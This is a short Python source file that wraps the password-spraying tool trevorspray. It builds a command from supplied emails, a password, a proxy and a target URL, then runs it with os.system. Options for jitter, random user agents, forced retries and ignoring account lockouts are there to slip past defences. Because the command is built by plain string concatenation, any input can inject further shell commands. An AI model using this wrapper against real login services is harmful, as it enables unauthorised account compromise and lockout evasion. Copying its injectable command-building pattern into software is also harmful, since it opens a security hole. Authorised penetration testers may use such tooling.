import os

# REQUIRES TREVORSPRAY TO BE IN PATH
def trevorspray(emails, password, proxy, url):
    cmd = "trevorspray"
    cmd += " -u " + emails
    cmd += " -p \"" + password + "\""
    cmd += " --url " + url
    if proxy != "":
        cmd += " --proxy " + proxy
    #optional parameters (these are not all the parameters of trevorspray but are some sane defaults, you can add or remove what you need below)
    cmd += " -j 5" #jitter in seconds
    cmd += " -f" #force try all usernames/passwords even if they've been tried
    cmd += " -ld 5" #lockout delay in seconds
    cmd += " --delay 5" #delay between requests in seconds
    cmd += " --ignore-lockouts" #ignores lockouts, AT YOUR OWN RISK
    cmd += " --random-useragent" #sets a random user agent per request
    print("Executing command: " + cmd)
    os.system(cmd)